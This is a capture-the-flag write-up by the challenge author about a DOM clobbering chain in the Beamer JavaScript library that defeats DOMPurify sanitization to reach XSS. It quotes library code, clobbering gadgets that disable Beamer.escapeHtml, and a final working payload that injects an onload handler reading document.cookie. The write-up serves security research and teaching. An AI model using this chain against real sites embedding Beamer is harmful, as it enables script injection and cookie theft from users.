---
source: kevin-mizu
source_url: https://mizu.re/post/under-the-beamer
title: "Under the Beamer | mizu.re"
description: "Under the Beamer"
---

_keyboard\_arrow\_up_

title: Under the Beamer

date: Sep 07, 2025

tags: [Writeup](https://mizu.re/tag/Writeup) [ASIS\_QUALS\_2025](https://mizu.re/tag/ASIS_QUALS_2025) [Web](https://mizu.re/tag/Web) [XSS](https://mizu.re/tag/XSS)

# Under the Beamer (revenge)

![](https://mizu.re/articles/writeups/ASIS_QUALS_2025/under-the-beamer/images/asis.png)

* * *

Difficulty: 500 points \| 0 solves

Description: Clobbered or not clobbered, that's the question :)

Author: [Me](https://x.com/kevin_mizu)

Sources: [here](https://mizu.re/articles/writeups/ASIS_QUALS_2025/under-the-beamer/under-the-beamers-revenge.tar.xz).

* * *

## Table of content

- [📌 TL.DR](https://mizu.re/post/under-the-beamer#tldr)
- [📜 Introduction](https://mizu.re/post/under-the-beamer#introduction)
- [📽️ Beamer library](https://mizu.re/post/under-the-beamer#beamer-library)
- [👊 DOM Clobbering](https://mizu.re/post/under-the-beamer#dom-clobbering)
- [🧽 Remove node gadget](https://mizu.re/post/under-the-beamer#remove-node-gadget)
- [💬 XSS gadget](https://mizu.re/post/under-the-beamer#xss-gadget)
- [💥 Putting everything together](https://mizu.re/post/under-the-beamer#putting-everything-together)

## [📌 TL.DR](https://mizu.re/post/under-the-beamer\#tldr)

![dom-clobbering.png](https://mizu.re/articles/writeups/ASIS_QUALS_2025/under-the-beamer/images/dom-clobbering.png)

## [📜 Introduction](https://mizu.re/post/under-the-beamer\#introduction)

The challenge was about a DOM Clobbering technique that I believe to be novel in the [Beamer](https://www.getbeamer.com/) library. The goal was to find a gadget that would bypass the DOMPurify sanitization in the specific library configuration. At the end of the 24h CTF, nobody managed to solve it.

_For those who played the challenge, I'm sorry to have forgotten the HTML sanitizer in the first version!_

If you aren't familiar with DOM Clobbering I highly recommend you start by reading about it. For example:

- [https://research.securitum.com/xss-in-amp4email-dom-clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering)
- [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [https://0xgodson.com/an-art-of-dom-clobbering](https://0xgodson.com/an-art-of-dom-clobbering)
- ...

That being said, let's dive into the challenge! Since the gadget was complex enough to be solved by itself, the challenge was straightforward. It was a simple rich text feature waiting for HTML to be sanitized, and rendered with the beamer library loaded.

![challenge.png](https://mizu.re/articles/writeups/ASIS_QUALS_2025/under-the-beamer/images/challenge.png)

**Fig. 1**: Challenge preview

Even if it was a client-side challenge, sources were available. Nothing special had to be found in it, the goal was mostly to be transparent with players.

```py
from flask import Flask, jsonify, render_template, Response
app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/initialize")
def initialize():
    return jsonify({ """Beamer config...""" })

# The following routes are not part of the challenge. I just don't want to make request to getbeamer.com
@app.route("/beamer-embed.js")
def beamer_embed():
    with open("beamer-embed.js", "r") as file:
        content = file.read()
        content = content.replace("https://app.getbeamer.com/", "/static/")
        content = content.replace("https://push.getbeamer.com/", "/")
        content = content.replace("https://static.getbeamer.com/", "/static/")
        content = content.replace("https://backend.getbeamer.com/", "/")

    return Response(content, mimetype="application/javascript")

@app.route("/numberFeatures")
def numberFeatures():
    return jsonify({"callbackNumber":0,"number":0,"priority":False})

@app.route("/embeddedPush")
def embeddedPush():
    return ""

@app.route("/realtimeUpdates")
def realtimeUpdates():
    return jsonify({"callbackNumber":0,"number":0,"priority":False})

if __name__ == "__main__":
    app.run("0.0.0.0", 5000, debug=True)
```

**Fig. 2**: /src/app/src/app.py

As you can see, the app had a few endpoints to avoid any beamer server communication. To do that, I just updated links in the source code without impacting any potential solution.

```js
function renderIframe() {
    const textarea = document.getElementById("content");
    const iframe = document.getElementById("renderer");
    const content = textarea.value;
    const sanitizedContent = DOMPurify.sanitize(content);

    try {
        localStorage.setItem("textareaContent", content);
    } catch (e) {
        console.warn("Could not save to localStorage:", e);
    }

    const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
        </head>
        <body>
            <div>${sanitizedContent}</div>
            <script>
                var beamer_config = {
                    product_id : "TCocQlcK73424",
                    user_id: "00000000-0000-0000-0000-000000000000"
                };
            <\/script>
            <script type="text/javascript" src="/beamer-embed.js" defer="defer"><\/script>
            <script>
                setTimeout(() => { Beamer.update({language: "FR"}) }, 1000); /*
                window.Beamer&&window.Beamer.update()
                */
            <\/script>
        </body>
        </html>`;

    iframe.srcdoc = htmlContent;
}
```

**Fig. 3**: /src/app/src/templates/index.html

On the frontend side, the code was very simple. It takes user input, sanitizes it with [DOMPurify](https://github.com/cure53/DOMPurify), and renders it in an iframe. The only important thing is that 1s after Beamer loads, it calls the update() method.

## [📽️ Beamer library](https://mizu.re/post/under-the-beamer\#beamer-library)

The Beamer library follows the "classic" configurable library schema, like [Hotjar](https://www.hotjar.com/), where the config object has to be defined before the library loads:

```html
<script>
    var beamer_config = {
      product_id : "TCocQlcK73424",
      user_id: "00000000-0000-0000-0000-000000000000"
    };
</script>
<script type="text/javascript" src="/beamer-embed.js" defer="defer"></script>
```

**Fig. 4**: [Beamer](https://www.getbeamer.com/) library initialization.

In those cases, most of the time we can see a lot of x = window.x \|\| {} as those libs need to be loaded dynamically. In the [Beamer](https://www.getbeamer.com/) library we can find a variation of this:

```js
'undefined' === typeof window.Beamer && (window.Beamer = {});
```

**Fig. 5**: window.Beamer vulnerable to Clobbering.

_This is mostly to ensure the library isn't already loaded :)_

In addition, looking more deeply into the library, it's possible to find several interesting functions that are used to insert HTML.

- Beamer.appendHtml → Uses innerHTML.
- Beamer.appendPushPermissionScript → Adds a new script.
- Beamer.appendPushSDKScript → Loads the Beamer push SDK.
- Beamer.drawAlert → Uses innerHTML to raise an alert.

With the window.Beamer clobbering and these interesting functions in mind, we might think that it shouldn't be too hard to find a gadget. Unfortunately, the library always properly checks every untrusted input type. For instance:

```js
a = 99 < Beamer.notificationNumber ? '99+' : '' + Beamer.notificationNumber
// ...
d.getElementsByClassName('beamer_icon') [0].innerHTML = a
```

**Fig. 6**: Important type verification in the [Beamer](https://www.getbeamer.com/) library.

Furthermore, each time an untrusted input string is used to insert HTML, the Beamer.escapeHtml function is used to avoid any injection.

```js
Beamer.escapeHtml = function(a) {
    try {
        return a.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;")
    } catch (b) {
        return a
    }
}
// ...

'undefined' !== typeof Beamer.escapeHtml && (n = Beamer.escapeHtml(n))
// ...
```

**Fig. 7**: HTML escaping in the [Beamer](https://www.getbeamer.com/) library.

At that point, it might look to be a dead end, but this is where an interesting DOM Clobbering behavior can be used.

## [👊 DOM Clobbering](https://mizu.re/post/under-the-beamer\#dom-clobbering)

Something well known is that on Chromium it is possible to have an [HTMLCollection](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection) when using two tags with the same id.

```html
<a id="x"></a><a id="x" name="y"></a>

<script>
console.log(x);
// HTMLCollection(2)
</script>
```

**Fig. 8**: [HTMLCollection](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection) DOM Clobbering.

However, something less well known is that [HTMLCollection](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection) items are not **writable**!

```html
<a id="x"></a><a id="x" name="y"></a>

<script>
console.log(Object.getOwnPropertyDescriptor(x, "y"));
// {value: a#x, writable: false, enumerable: false, configurable: true}
</script>
```

**Fig. 9**: [HTMLCollection](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection) items aren't writable.

Because of this, even if you try to overwrite the value from JS, nothing will happen (as long as you aren't in strict mode).

- Not in [strict mode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode).

```html
<a id="x"></a><a id="x" name="y"></a>

<script>
console.log(x.y);
// <a id="x" name="y"></a>
x.y = "mizu";
console.log(x.y);
// <a id="x" name="y"></a>
</script>
```

**Fig. 10**: [HTMLCollection](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection) item modification in non- [strict mode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode).

- In [strict mode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode).

```html
<a id="x"></a><a id="x" name="y"></a>

<script>
"use strict";

console.log(x.y);
// <a id="x" name="y"></a>
x.y = "mizu";
// Uncaught TypeError: Failed to set a named property 'y' on 'HTMLCollection': Named property setter is not supported.
</script>
```

**Fig. 11**: [HTMLCollection](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection) item modification in [strict mode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode).

_This is because strict mode ensures you don't do "illegal" things like writing a property that isn't writable. This makes [Hotjar](https://www.hotjar.com/) safe, btw._

In the context of Beamer, this is very interesting for a single reason:

```html
<a id="Beamer"></a><a id="Beamer" name="escapeHtml" class="remove"></a>

<script>
'undefined' === typeof window.Beamer && (window.Beamer = {});
// Beamer = HTMLCollection(2)
Beamer.escapeHtml = () => { /* safe escapeHtml function */ };
// Beamer.escapeHtml = <a id="Beamer" name="escapeHtml"></a>

// What if we have a gadget to remove `<a id="Beamer" name="escapeHtml"></a>` now?
document.getElementByClassName(".remove").remove(); // This is an example
// Beamer.escapeHtml = undefined

'undefined' !== typeof Beamer.escapeHtml && (n = Beamer.escapeHtml(n)) // This won't do anything now :)
document.body.innerHTML = n; // This is an example
</script>
```

**Fig. 12**: DOM clobbering chain abusing non [strict mode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode).

If I sum up, the idea is to:

1. Clobber Beamer.escapeHtml to block the function assignment.
2. Find a gadget to remove the Beamer.escapeHtml clobbering tag. This would make Beamer.escapeHtml undefined.
3. Find a gadget that leads to an innerHTML which won't be protected by Beamer.escapeHtml anymore.

## [🧽 Remove node gadget](https://mizu.re/post/under-the-beamer\#remove-node-gadget)

At that point, there might be several solutions. Mine was to abuse removeIframe to remove the <p id="Beamer" name="escapeHtml"></p> tag:

```js
Beamer.removeIframe = function() {
    var a = Beamer.isInApp() ? "beamerNews" : "beamerOverlay";
    Beamer.forEachElement(a, function(b) {
        b.parentNode.removeChild(b)
    })
}
```

**Fig. 13**: Beamer.removeIframe function.

From the above snippet, we can see that removeIframe will remove all children of #beamerNews or #beamerOverlay. Finding a way to call it would allow us to remove the escapeHtml tag using:

```html
<a id="beamerOverlay"><p id="Beamer" name="escapeHtml"></p></a>
```

**Fig. 14**: Remove Clobbering gadget.

_Here we are using a .removeChild gadget, but a simple .innerHTML could have done the job._

The call I used in my solution is:

```js
Beamer.appendAlert = function(a, b) {
    // ...
    var l = Beamer.getConfigParameter(f, "activateAutoRefresh");
    if (!Beamer.isEmbedMode() && ("undefined" === typeof beamer_config.auto_refresh || beamer_config.auto_refresh) && "undefined" !== typeof l && l && "undefined" !== typeof k && k) {
        if (h || "undefined" !== typeof b && b)
            _BEAMER_IS_OPEN ? Beamer.removeOnHide = !0 : Beamer.removeIframe(),
```

**Fig. 15**: Beamer.appendAlert function.

As we can see, appendAlert has to be called with the 2nd param set to true. This is where the Beamer.update({ language: "FR" }) call was important, since it does exactly that! So we don't need to do anything, just wrap the escapeHtml tag in the #beamerOverlay tag :)

```js
Beamer.update = function(a) {
    if ("undefined" !== typeof a) {
        var b = !1;
        // ...
        "undefined" !== typeof a.language && beamer_config.language !== a.language && (beamer_config.language = a.language,
        b = !0);
        // ...
        for (var c in a)
            if (a.hasOwnProperty(c) && !(-1 < Beamer.reservedParameters.indexOf(c))) {
                var d = a[c];
                "undefined" === typeof d || "object" === typeof d || Beamer.isFunction(d) || beamer_config[c] === d || (beamer_config[c] = d,
                b = !0)
            }
        b && (Beamer.started ? Beamer.appendAlert(!0, !0) : Beamer.init()) // HERE
    }
}
```

**Fig. 16**: Beamer.update function.

_The enableAutoRefresh and activateAutoRefresh config option has to be enabled_

## [💬 XSS gadget](https://mizu.re/post/under-the-beamer\#xss-gadget)

Now, the last step is to find the XSS gadget using the Beamer.escapeHtml bypass. Mine was to abuse appendUtilitiesIframe to get the XSS:

```js
Beamer.appendUtilitiesIframe = function(a) {
    if ("undefined" === typeof Beamer.config.disableUtilitiesIframe || !Beamer.config.disableUtilitiesIframe)
        try {
            if (!document.getElementById("beamerUtilities")) {
                var b = "undefined" !== typeof Beamer.customDomain ? Beamer.customDomain : _BEAMER_URL;
                b += "utilities?app_id=" + beamer_config.product_id;
                "undefined" !== typeof Beamer.escapeHtml && (b = Beamer.escapeHtml(b));
                Beamer.appendHtml(document.body, "<iframe id='beamerUtilities' src='" + b + "' width='0' height='0' frameborder='0' scrolling='no'></iframe>")
            }
            "undefined" !== typeof Beamer.customDomain && Beamer.setIframeCookies();
            "undefined" !== typeof a && a && Beamer.initUpdatesListener()
        } catch (c) {
            Beamer.logError(c)
        }
}
```

_It wasn't possible to directly use src="javascript:alert()" because of DOMPurify._

**Fig. 17**: Beamer.appendUtilitiesIframe function.

From the above snippet, we can see that if beamerUtilities isn't in the DOM yet, it will create an iframe with unescaped Beamer.customDomain value. This can be done with:

```html
<a id="Beamer" name="customDomain" href="http:'/onload='console.log(document.cookie)'/x='"></a>
```

**Fig. 18**: customDomain clobbering payload.

_http: is required to not be removed by DOMPurify. Furthermore, it works because ' isn't URL encoded in the path :)_

To reach this sink, we don't need to do anything! Why? It is called only few lines below the removal gadget :D

```js
Beamer.appendAlert = function(a, b) { // HERE
    // ...

    if (!Beamer.isEmbedMode() && ("undefined" === typeof beamer_config.auto_refresh || beamer_config.auto_refresh) && "undefined" !== typeof l && l && "undefined" !== typeof k && k) {
        if (h || "undefined" !== typeof b && b)
            _BEAMER_IS_OPEN ? Beamer.removeOnHide = !0 : Beamer.removeIframe(),
            Beamer.setCookie(_BEAMER_LAST_UPDATE + "_" + beamer_config.product_id, (new Date).getTime(), 300);
        h = Beamer.getConfigParameter(f, "autoRefreshTimeout");
        "undefined" !== typeof h ? Beamer.autoRefreshTimeout = h : "undefined" !== typeof Beamer.autoRefreshTimeout && Beamer.autoRefreshTimeout || (Beamer.autoRefreshTimeout = 1201E3);
        h = Beamer.getConfigParameter(f, "enableUpdatesListener");
        "undefined" !== typeof h && h ? (f = Beamer.getConfigParameter(f, "updatesDelay"),
        "undefined" !== typeof f && 0 <= f && (Beamer.updatesMaxDelay = f),
        Beamer.appendUtilitiesIframe(!0)) : Beamer.prepareAutoRefresh() // HERE
```

**Fig. 19**: Beamer.appendAlert function.

While it looks to be "win", it's not enough. Trying to get XSS with the following payload will result in an error:

```html
<a id="Beamer"></a><a id="Beamer" name="customDomain" href="http:'/onload='console.log(document.cookie)'/x='">'></a><a id="beamerOverlay"><p id="Beamer" name="escapeHtml"></p></a>
```

**Fig. 20**: Updated solution payload.

```js
Uncaught TypeError: Beamer.escapeHtml is not a function
    at Beamer.appendPushScript (VM197 beamer-embed.js:67:374)
    at VM197 beamer-embed.js:101:374
    at f.onreadystatechange (VM197 beamer-embed.js:160:375)
```

**Fig. 21**: Clobbering error.

This is caused by:

```js
Beamer.appendPushScript = function(a) {
    if (!(Beamer.isSafari() || Beamer.isIE() || Beamer.isFacebookApp() || Beamer.isInstagramApp()))
        if ("undefined" !== typeof Beamer.pushDomain)
            (Beamer.pushDomain == window.location.host || "undefined" !== typeof Beamer.extendedPushDomain && Beamer.extendedPushDomain && window.location.host.endsWith("." + Beamer.pushDomain)) && Beamer.appendPushPermissionScript(a);
        else if ("undefined" !== typeof _BEAMER_PUSH_PROMPT_TYPE && ("popup" == _BEAMER_PUSH_PROMPT_TYPE || "sidebar" == _BEAMER_PUSH_PROMPT_TYPE)) {
            // ...
            "undefined" !== typeof Beamer.escapeHtml && (b = Beamer.escapeHtml(b)); // HERE
            Beamer.appendHtml(document.body, "<iframe id='beamerPush' src='" + b + "' width='0' height='0' frameborder='0' scrolling='no'></iframe>")
        }
}
```

**Fig. 21**: Beamer.appendPushScript.

Fortunately, having Beamer.pushDomain not null avoids this error from occurring! 🔥

## [💥 Putting everything together](https://mizu.re/post/under-the-beamer\#putting-everything-together)

We have everything to get the XSS working!

```sh
echo '<p id="Beamer" name="pushDomain"></p><p id="Beamer"></p><a id="Beamer" name="customDomain" href="http:'"'"'/onload='"'"'console.log(document.cookie)'"'"'/x='"'"'"></a><a id="beamerOverlay"><p id="Beamer" name="escapeHtml"></p></a>' | nc localhost 5000
```

**Fig. 22**: Final payload.

![solve.png](https://mizu.re/articles/writeups/ASIS_QUALS_2025/under-the-beamer/images/solve.png)

**Fig. 23**: FLAG!

[_keyboard\_arrow\_left_ FCSC 2026 Writeups](https://mizu.re/post/fcsc-2026-writeups)

[FCSC 2025 Writeups _keyboard\_arrow\_right_](https://mizu.re/post/fcsc-2025-writeups)